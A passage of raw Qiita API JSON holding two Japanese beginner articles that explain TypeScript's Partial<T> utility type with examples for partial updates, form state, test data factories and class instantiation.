<span class=\"nx\">user2</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n  <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"mi\">2</span><span class=\"p\">,</span>\n  <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">テスト花子</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">email</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">hanako@example.com</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n  <span class=\"na\">age</span><span class=\"p\">:</span> <span class=\"mi\">25</span><span class=\"p\">,</span>\n  <span class=\"na\">isActive</span><span class=\"p\">:</span> <span class=\"kc\">true</span>\n<span class=\"p\">};</span>\n\n\n\n<span class=\"c1\">// ✅ Partialを使った場合（一部のプロパティだけでOK）</span>\n<span class=\"kd\">function</span> <span class=\"nf\">createTestUser</span><span class=\"p\">(</span><span class=\"nx\">override</span><span class=\"p\">:</span> <span class=\"nb\">Partial</span><span class=\"o\">&lt;</span><span class=\"nx\">User</span><span class=\"o\">&gt;</span> <span class=\"o\">=</span> <span class=\"p\">{}):</span> <span class=\"nx\">User</span> <span class=\"p\">{</span>\n  <span class=\"c1\">// デフォルト値</span>\n  <span class=\"kd\">const</span> <span class=\"nx\">defaultUser</span><span class=\"p\">:</span> <span class=\"nx\">User</span> <span class=\"o\">=</span> <span class=\"p\">{</span>\n    <span class=\"na\">id</span><span class=\"p\">:</span> <span class=\"mi\">999</span><span class=\"p\">,</span>\n    <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">テストあああ</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n    <span class=\"na\">email</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">test@example.com</span><span class=\"dl\">\"</span><span class=\"p\">,</span>\n    <span class=\"na\">age</span><span class=\"p\">:</span> <span class=\"mi\">30</span><span class=\"p\">,</span>\n    <span class=\"na\">isActive</span><span class=\"p\">:</span> <span class=\"kc\">true</span>\n  <span class=\"p\">};</span>\n  \n  <span class=\"c1\">// デフォルト値と上書き値をマージ</span>\n  <span class=\"k\">return</span> <span class=\"p\">{</span> <span class=\"p\">...</span><span class=\"nx\">defaultUser</span><span class=\"p\">,</span> <span class=\"p\">...</span><span class=\"nx\">override</span> <span class=\"p\">};</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// 名前だけ変えたユーザー</span>\n<span class=\"kd\">const</span> <span class=\"nx\">user1</span> <span class=\"o\">=</span> <span class=\"nf\">createTestUser</span><span class=\"p\">({</span> <span class=\"na\">name</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">山田あああ</span><span class=\"dl\">\"</span> <span class=\"p\">});</span>\n\n<span class=\"c1\">// アクティブでないユーザー</span>\n<span class=\"kd\">const</span> <span class=\"nx\">user2</span> <span class=\"o\">=</span> <span class=\"nf\">createTestUser</span><span class=\"p\">({</span> <span class=\"na\">isActive</span><span class=\"p\">:</span> <span class=\"kc\">false</span> <span class=\"p\">});</span>\n</code></pre></div></div>\n<h1 data-sourcepos=\"213:1-213:26\">\n<span id=\"ユーティリティ型\" class=\"fragment\"></span><a href=\"#%E3%83%A6%E3%83%BC%E3%83%86%E3%82%A3%E3%83%AA%E3%83%86%E3%82%A3%E5%9E%8B\"><i class=\"fa fa-link\"></i></a>ユーティリティ型</h1>\n<p data-sourcepos=\"214:1-215:129\"><code>Partial&lt;T&gt;</code>の他に全プロパティを必須にする<code>Required&lt;T&gt;</code>もあることに気づきました。<br>\nこれらの型は大きくまとめるとユーティリティ型の一部ということを関連資料から学びました。</p>\n<p data-sourcepos=\"217:1-217:60\"><iframe id=\"qiita-embed-content__a21e6fbce6be195240dda5d0b8a1daab\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a21e6fbce6be195240dda5d0b8a1daab\" data-content=\"https%3A%2F%2Ftypescriptbook.jp%2Freference%2Ftype-reuse%2Futility-types\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"219:1-219:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"220:1-220:138\"><code>Partial&lt;T&gt;</code>を個人で使いこなせるようになりつつ、他のユーティリティ型もマスターしていきたいです。</p>\n<h1 data-sourcepos=\"222:1-222:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"223:1-223:55\"><iframe id=\"qiita-embed-content__dda941c45f839a1241c8b6f39269b3c4\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__dda941c45f839a1241c8b6f39269b3c4\" data-content=\"https%3A%2F%2Fqiita.com%2FTsuyoshi84%2Fitems%2Fe74109e2ccc0f4e625aa\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"225:1-225:68\"><iframe id=\"qiita-embed-content__7079ce895ea1dabcb9c6981cff609213\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7079ce895ea1dabcb9c6981cff609213\" data-content=\"https%3A%2F%2Ftypescriptbook.jp%2Freference%2Ftype-reuse%2Futility-types%2Fpartial\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"227:1-227:141\"><iframe id=\"qiita-embed-content__6c0e40c7376d1dede4be4b1a5649f87d\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__6c0e40c7376d1dede4be4b1a5649f87d\" data-content=\"https%3A%2F%2Ftypescriptbook.jp%2Ftips%2Fshallow-copy-object%23%25E6%25B5%2585%25E3%2581%2584%25E3%2582%25B3%25E3%2583%2594%25E3%2583%25BC%25E3%2582%2592%25E5%25AE%259F%25E8%25A3%2585%25E3%2581%2599%25E3%2582%258B\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"229:1-229:69\"><iframe id=\"qiita-embed-content__0e661d2d47411fc511a7467c1d746cbd\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__0e661d2d47411fc511a7467c1d746cbd\" data-content=\"https%3A%2F%2Ftypescriptbook.jp%2Freference%2Ftype-reuse%2Futility-types%2Frequired\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"231:1-231:60\"><iframe id=\"qiita-embed-content__cd87a91fe704c41cb8e34e5094baa9e3\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__cd87a91fe704c41cb8e34e5094baa9e3\" data-content=\"https%3A%2F%2Ftypescriptbook.jp%2Freference%2Ftype-reuse%2Futility-types\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nTypeScriptの学習を進めていて、`Partial<T>`という型があることを学びました。\n`Partial<T>`の概要と、使用メリットについて学んだことをまとめます。\n\n# Partial\\<T>とは\n**サバイバルTypeScriptより引用**\n>Partial\\<T>は、オブジェクトの型Tのすべてのプロパティをオプションプロパティにするユーティリティ型です。\n>>ユーティリティ型 (utility type)は、型から別の型を導き出してくれる型です。\n\n# Partial\\<T>の基本的な使い方\n例えば、以下のtypeを定義していたとします。\n\n```ts:type.ts\nexport type Data = {\n  id: string;\n  title: string;\n  time: number;\n  created_at: string;\n};\n\nconst data: Data = {\n  id: \"1\",\n  title: \"タイトル\",\n  time: 1,\n  created_at: \"2025-04-06\",\n};\n\nconsole.log(data);\n```\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/79f7dc78-b8db-4e5e-8631-9ad5710f2d02.png)\n\nこの場合、全てのプロパティを指定しないとコンパイルエラーになります。\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/40b190e2-73c4-4615-8cad-07fcbbf37f1f.png)\n\n`export type Data = {}`の各プロパティを全てオプションにしたいとき、各プロパティに`?`をつけることで可能です。\nしかし、仮にプロパティが何10個もあるようなデータ型だと、全てに`?`をつけるのは大変です。\n\nその時に`Partial`を使用すると簡潔に各プロパティをオプションにすることができます。\n```ts:type.ts\nexport type Data = {\n  id: string;\n  title: string;\n  time: number;\n  created_at: string;\n};\n\n// 既存のDataのプロパティを全てオプションにする\nexport type newData = Partial<Data>;\n```\n\nこの結果、内部的にnewDataは次のように変換されます。\n```ts\nexport type newData = {\n  id?: string | undefined;\n  title?: string | undefined;\n  time?: number | undefined;\n  created_at?: string | undefined;\n};\n```\n\n```ts\n// timeプロパティのみ指定\nconst newData: newData = {\n  time: 1,\n};\nconsole.log(newData);\n```\ntimeプロパティのみ指定した実行結果は下記のようになります\n![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/e157bc04-0a40-47d4-9f84-00d3a3c2d6f1.png)\n\n\n\n# Partial\\<T>の使いどころ\n主な使用例は下記の通りです。各使用例とメリットについてまとめました。\n1. オブジェクトの一部だけを更新したいとき\n2. フォーム入力の状態管理\n2. テストデータの作成\n\n\n### 1.オブジェクトの一部だけを更新したいとき\n#### データの一部だけを更新したいときに使用\n例として、ユーザー情報の名前だけ変更したい場合を考えてみます\n本来はユーザー情報全てのプロパティを指定しないといけない所、`Partial<T>`を使うことで名前だけ更新することができます。\n\n```ts\ninterface User {\n  id: number;\n  name: string;\n  email: string;\n  age: number;\n}\n\n// ❌ Partialなしの場合（すべてのプロパティが必要）\nconst updateUserWithoutPartial = (user: User) => {\n  // 更新処理\n};\n\n// このように呼び出す必要がある（すべてのプロパティを指定）\nupdateUserWithoutPartial({\n  id: 1,\n  name: \"なまえ\",\n  email: \"name@example.com\",\n  age: 20\n});\n\n// ✅ Partialを使った場合（一部のプロパティだけでOK）\nconst updateUser = (userId: number, updates: Partial<User>) => {\n  // userIdで既存データを取得、updatesの内容で更新\n};\n\n// 名前だけ更新で済む\nupdateUser(1, { name: \"田中あああ\" });\n```\n\n### 2.フォーム状態の管理\n#### 不完全な状態や任意の項目のときに使用\n例として、入力途中のデータを保存したいときを考えてみます。\n`Partial<T>`を使用しない場合、登録項目をすべて指定しないと、登録できません。\n名前だけを途中で保存したいとき、`Partial<T>`を使うことで名前だけ登録することができます。\n\n```ts\n// ユーザー情報の型\ntype UserForm = {\n  name: string;\n  email: string;\n  age: number;\n  address: string;\n};\n\n// ❌ Partialなしの場合（すべてのプロパティが必要）\n// ユーザー登録関数\nfunction registerUser(user: UserForm) {\n  // ユーザー登録処理\n  console.log(\"ユーザーを登録しました:\", user);\n}\n\n// 使用例（全ての情報が必要）\nregisterUser({\n  name: \"山田あああ\",\n  email: \"\",   //名前のみ登録したい場合、空文字を指定する必要がある\n  age: 0,      //名前のみ登録したい場合、初期値を指定する必要がある\n  address: \"\"  //住所のみ登録したい場合、空文字を指定する必要がある\n});\n\n// ✅ Partialを使った場合（一部のプロパティだけでOK）\nfunction registerUser(user: Partial<UserForm>) {\n  // ユーザー登録処理\n  console.log(\"ユーザーを登録しました:\", user);\n}\n\nregisterUser({\n  name: \"山田あああ\",\n});\n```\n\n\n### 3.テストデータの作成\n#### ユーザー情報の一部分のみを変えて大量にテストデータを作成したいとき\n`Partial<T>`を使用しない場合、登録項目をすべて指定しないと、ユーザー情報を作成できません。\n`Partial<T>`を使うことで一部分のみ変更して、データを作成することができます。\n\n```ts\ntype User = {\n  id: number,\n  name: string,\n  email: string,\n  age: number,\n  isActive: boolean\n}\n\n// ❌ Partialなしの場合（すべてのプロパティが必要）\n// 全プロパティを指定、一つずつ作成が必要\nconst user1 = {\n  id: 1,\n  name: \"テスト花子\",\n  email: \"hanako@example.com\",\n  age: 25,\n  isActive: true\n};\n\nconst user2 = {\n  id: 2,\n  name: \"テスト花子\",\n  email: \"hanako@example.com\",\n  age: 25,\n  isActive: true\n};\n\n\n\n// ✅ Partialを使った場合（一部のプロパティだけでOK）\nfunction createTestUser(override: Partial<User> = {}): User {\n  // デフォルト値\n  const defaultUser: User = {\n    id: 999,\n    name: \"テストあああ\",\n    email: \"test@example.com\",\n    age: 30,\n    isActive: true\n  };\n  \n  // デフォルト値と上書き値をマージ\n  return { ...defaultUser, ...override };\n}\n\n// 名前だけ変えたユーザー\nconst user1 = createTestUser({ name: \"山田あああ\" });\n\n// アクティブでないユーザー\nconst user2 = createTestUser({ isActive: false });\n```\n\n# ユーティリティ型\n`Partial<T>`の他に全プロパティを必須にする`Required<T>`もあることに気づきました。\nこれらの型は大きくまとめるとユーティリティ型の一部ということを関連資料から学びました。\n\nhttps://typescriptbook.jp/reference/type-reuse/utility-types\n\n# おわりに\n`Partial<T>`を個人で使いこなせるようになりつつ、他のユーティリティ型もマスターしていきたいです。\n\n# 参考\nhttps://qiita.com/Tsuyoshi84/items/e74109e2ccc0f4e625aa\n\nhttps://typescriptbook.jp/reference/type-reuse/utility-types/partial\n\nhttps://typescriptbook.jp/tips/shallow-copy-object#%E6%B5%85%E3%81%84%E3%82%B3%E3%83%94%E3%83%BC%E3%82%92%E5%AE%9F%E8%A3%85%E3%81%99%E3%82%8B\n\nhttps://typescriptbook.jp/reference/type-reuse/utility-types/required\n\nhttps://typescriptbook.jp/reference/type-reuse/utility-types\n\n\n\n\n\n\n\n\n\n","coediting":false,"comments_count":0,"created_at":"2025-04-08T22:35:41+09:00","group":null,"id":"3bf0bb7b8574739ad528","likes_count":1,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"初心者","versions":[]},{"name":"TypeScript","versions":[]},{"name":"型","versions":[]}],"title":"【TypeScript】Partial<T>とは、使うと何がいい？","updated_at":"2025-04-09T23:06:30+09:00","url":"https://qiita.com/asa129/items/3bf0bb7b8574739ad528","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":958,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:92\">クラスのインスタンス化の学習を進めていて、<code>Partial&lt;T&gt;</code>という型があることを学びました。<br>\nPartial&lt;T&gt;の概要と、使用メリットについて学んだことをまとめます。</p>\n<h1 data-sourcepos=\"5:1-5:19\">\n<span id=\"partialtとは\" class=\"fragment\"></span><a href=\"#partialt%E3%81%A8%E3%81%AF\"><i class=\"fa fa-link\"></i></a>Partial&lt;T&gt;とは</h1>\n<p data-sourcepos=\"6:1-6:41\"><strong>サバイバルTypeScriptより引用</strong></p>\n<blockquote data-sourcepos=\"7:1-8:105\">\n<p data-sourcepos=\"7:3-7:152\"><code>Partial&lt;T&gt;</code>は、オブジェクトの型<code>T</code>のすべてのプロパティをオプションプロパティにするユーティリティ型です。</p>\n<blockquote data-sourcepos=\"8:2-8:105\">\n<p data-sourcepos=\"8:4-8:105\">ユーティリティ型 (utility type)は、型から別の型を導き出してくれる型です。</p>\n</blockquote>\n</blockquote>\n<h1 data-sourcepos=\"10:1-10:34\">\n<span id=\"partialtを使うメリット\" class=\"fragment\"></span><a href=\"#partialt%E3%82%92%E4%BD%BF%E3%81%86%E3%83%A1%E3%83%AA%E3%83%83%E3%83%88\"><i class=\"fa fa-link\"></i></a>Partial&lt;T&gt;を使うメリット</h1>\n<p data-sourcepos=\"11:1-11:109\">インスタンス化する際に、<strong>全てのプロパティを指定する必要がない</strong>ことです。</p>\n<h1 data-sourcepos=\"13:1-13:34\">\n<span id=\"partialtを使用しない例\" class=\"fragment\"></span><a href=\"#partialt%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%AA%E3%81%84%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>Partial&lt;T&gt;を使用しない例</h1>\n<p data-sourcepos=\"14:1-15:156\">以下のクラスを作成したとします。<br>\n各プロパティは<code>?</code>でオプション指定をしており、インスタンス化する際に値指定は必須でないように定義しました。</p>\n<p data-sourcepos=\"17:1-17:61\">インスタンス化は以下の2通りで行いました。</p>\n<ul data-sourcepos=\"18:1-21:72\">\n<li data-sourcepos=\"18:1-19:70\">\n<code>const record = new Record(\"1\", \"タイトル\", 1, \"2025-04-06\");</code><br>\n→全てのプロパティに値を指定してインスタンス化</li>\n<li data-sourcepos=\"20:1-21:72\">\n<code>const recordUndefined = new Record(undefined, \"タイトル\", 1, \"2025-04-06\");</code><br>\n→id以外のプロパティに値を指定してインスタンス化</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"22:1-38:3\">\n<div class=\"code-lang\"><span class=\"bold\">record.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">export</span> <span class=\"kd\">class</span> <span class=\"nc\">Record</span> <span class=\"p\">{</span>\n  <span class=\"nf\">constructor</span><span class=\"p\">(</span>\n    <span class=\"k\">public</span> <span class=\"nx\">id</span><span class=\"p\">?:</span> <span class=\"kr\">string</span><span class=\"p\">,</span>\n    <span class=\"k\">public</span> <span class=\"nx\">title</span><span class=\"p\">?:</span> <span class=\"kr\">string</span><span class=\"p\">,</span>\n    <span class=\"k\">public</span> <span class=\"nx\">time</span><span class=\"p\">?:</span> <span class=\"kr\">number</span><span class=\"p\">,</span>\n    <span class=\"k\">public</span> <span class=\"nx\">created_at</span><span class=\"p\">?:</span> <span class=\"kr\">string</span>\n  <span class=\"p\">)</span> <span class=\"p\">{}</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// 全てのプロパティに値を指定して、インスタンス化</span>\n<span class=\"kd\">const</span> <span class=\"nx\">record</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">Record</span><span class=\"p\">(</span><span class=\"dl\">\"</span><span class=\"s2\">1</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">タイトル</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">2025-04-06</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">record</span><span class=\"p\">);</span>\n<span class=\"c1\">// id以外の値を指定して、インスタンス化</span>\n<span class=\"kd\">const</span> <span class=\"nx\">recordUndefined</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">Record</span><span class=\"p\">(</span><span class=\"kc\">undefined</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">タイトル</span><span class=\"dl\">\"</span><span class=\"p\">,</span> <span class=\"mi\">1</span><span class=\"p\">,</span> <span class=\"dl\">\"</span><span class=\"s2\">2025-04-06</span><span class=\"dl\">\"</span><span class=\"p\">);</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">recordUndefined</span><span class=\"p\">);</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"39:1-40:122\">実行結果は下記の通りになります。<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb8ae0f46-e816-4134-b157-24549645c19c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e5a80b60e72cb31e7b72e4b5880dac3b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb8ae0f46-e816-4134-b157-24549645c19c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e5a80b60e72cb31e7b72e4b5880dac3b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fb8ae0f46-e816-4134-b157-24549645c19c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=be44bf4208af738c47e4c10d8bdca516 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/b8ae0f46-e816-4134-b157-24549645c19c.png\"></a></p>\n<p data-sourcepos=\"42:1-43:81\"><strong>定義不要のプロパティでも、明示的に<code>undefined</code>を指定しなければいけません</strong><br>\nプロパティの数が増えたときは非常に面倒になりそうです。</p>\n<h1 data-sourcepos=\"45:1-45:31\">\n<span id=\"partialtを使用した例\" class=\"fragment\"></span><a href=\"#partialt%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%97%E3%81%9F%E4%BE%8B\"><i class=\"fa fa-link\"></i></a>Partial&lt;T&gt;を使用した例</h1>\n<ul data-sourcepos=\"46:1-50:0\">\n<li data-sourcepos=\"46:1-46:49\">class内で各プロパティを定義します</li>\n<li data-sourcepos=\"47:1-47:90\">コンストラクタの引数には<code>変数: init</code>、<code>型: Partial&lt;T&gt;</code>を指定します</li>\n<li data-sourcepos=\"48:1-48:134\">\n<code>Object.assign(this, init);</code>でinitオブジェクトのプロパティをthis（クラスインスタンス）にコピーします</li>\n<li data-sourcepos=\"49:1-50:0\">タイトルのみ指定して、インスタンス化しました</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"ts\" data-sourcepos=\"51:1-66:3\">\n<div class=\"code-lang\"><span class=\"bold\">record.ts</span></div>\n<div class=\"highlight\"><pre><code><span class=\"k\">export</span> <span class=\"kd\">class</span> <span class=\"nc\">PartialRecord</span> <span class=\"p\">{</span>\n  <span class=\"k\">public</span> <span class=\"nx\">id</span><span class=\"p\">?:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"k\">public</span> <span class=\"nx\">title</span><span class=\"p\">?:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n  <span class=\"k\">public</span> <span class=\"nx\">time</span><span class=\"p\">?:</span> <span class=\"kr\">number</span><span class=\"p\">;</span>\n  <span class=\"k\">public</span> <span class=\"nx\">created_at</span><span class=\"p\">?:</span> <span class=\"kr\">string</span><span class=\"p\">;</span>\n\n  <span class=\"nf\">constructor</span><span class=\"p\">(</span><span class=\"nx\">init</span><span class=\"p\">:</span> <span class=\"nb\">Partial</span><span class=\"o\">&lt;</span><span class=\"nx\">PartialRecord</span><span class=\"o\">&gt;</span><span class=\"p\">)</span> <span class=\"p\">{</span>\n    <span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nf\">assign</span><span class=\"p\">(</span><span class=\"k\">this</span><span class=\"p\">,</span> <span class=\"nx\">init</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n<span class=\"p\">}</span>\n\n<span class=\"c1\">// titleのみ指定して、インスタンス化</span>\n<span class=\"kd\">const</span> <span class=\"nx\">partialRecord</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">PartialRecord</span><span class=\"p\">({</span> <span class=\"na\">title</span><span class=\"p\">:</span> <span class=\"dl\">\"</span><span class=\"s2\">a</span><span class=\"dl\">\"</span> <span class=\"p\">});</span>\n<span class=\"nx\">console</span><span class=\"p\">.</span><span class=\"nf\">log</span><span class=\"p\">(</span><span class=\"nx\">partialRecord</span><span class=\"p\">);</span>\n</code></pre></div>\n</div>\n<p data-sourcepos=\"67:1-67:39\">実行結果は下記の通りです。</p>\n<p data-sourcepos=\"69:1-69:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc294bbe2-5f71-4c55-87d7-71f8d6cd74e9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c81f4904e5f809eb85666e15518c60ba\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc294bbe2-5f71-4c55-87d7-71f8d6cd74e9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=c81f4904e5f809eb85666e15518c60ba\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc294bbe2-5f71-4c55-87d7-71f8d6cd74e9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=3b1acc7015fe689c629faa015508a525 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c294bbe2-5f71-4c55-87d7-71f8d6cd74e9.png\"></a></p>\n<p data-sourcepos=\"71:1-72:80\"><strong>タイトル以外のプロパティは明示的に<code>undefined</code>を指定せずともインスタンス化できました</strong><br>\nこれが、Partial&lt;T&gt;を使用する最大のメリットだと思います。</p>\n<h1 data-sourcepos=\"74:1-74:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"75:1-75:124\"><code>Partial&lt;T&gt;</code>の他に全プロパティを必須にする<code>Required&lt;T&gt;</code>もあることを関連資料から学びました。</p>\n<h1 data-sourcepos=\"77:1-77:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"79:1-79:55\"><iframe id=\"qiita-embed-content__e22a2283e4e2e0ad0eceab4cddaf5903\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__e22a2283e4e2e0ad0eceab4cddaf5903\" data-content=\"https%3A%2F%2Fqiita.com%2FTsuyoshi84%2Fitems%2Fe74109e2ccc0f4e625aa\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"81:1-81:68\"><iframe id=\"qiita-embed-content__79e8409416833b013ebe7eee444d5ce4\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__79e8409416833b013ebe7eee444d5ce4\" data-content=\"https%3A%2F%2Ftypescriptbook.jp%2Freference%2Ftype-reuse%2Futility-types%2Fpartial\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"83:1-83:141\"><iframe id=\"qiita-embed-content__0854a7e87e1ade6177e318a3eeb51839\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__0854a7e87e1ade6177e318a3eeb51839\" data-content=\"https%3A%2F%2Ftypescriptbook.jp%2Ftips%2Fshallow-copy-object%23%25E6%25B5%2585%25E3%2581%2584%25E3%2582%25B3%25E3%2583%2594%25E3%2583%25BC%25E3%2582%2592%25E5%25AE%259F%25E8%25A3%2585%25E3%2581%2599%25E3%2582%258B\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"85:1-85:69\"><iframe id=\"qiita-embed-content__3ffea715d97a406690904cb33fbcfc45\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__3ffea715d97a406690904cb33fbcfc45\" data-content=\"https%3A%2F%2Ftypescriptbook.jp%2Freference%2Ftype-reuse%2Futility-types%2Frequired\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"87:1-87:60\"><iframe id=\"qiita-embed-content__d9166d2b03b8c1d2dc58654f398ec116\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__d9166d2b03b8c1d2dc58654f398ec116\" data-content=\"https%3A%2F%2Ftypescriptbook.jp%2Freference%2Ftype-reuse%2Futility-types\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\nクラスのインスタンス化の学習を進めていて、`Partial<T>`という型があることを学びました。\nPartial\\<T>の概要と、使用メリットについて学んだことをまとめます。\n\n# Partial\\<T>とは\n**サバイバルTypeScriptより引用**\n> `Partial<T>`は、オブジェクトの型`T`のすべてのプロパティをオプションプロパティにするユーティリティ型です。\n>> ユーティリティ型 (utility type)は、型から別の型を導き出してくれる型です。\n\n# Partial\\<T>を使うメリット\nインスタンス化する際に、**全てのプロパティを指定する必要がない**ことです。\n\n# 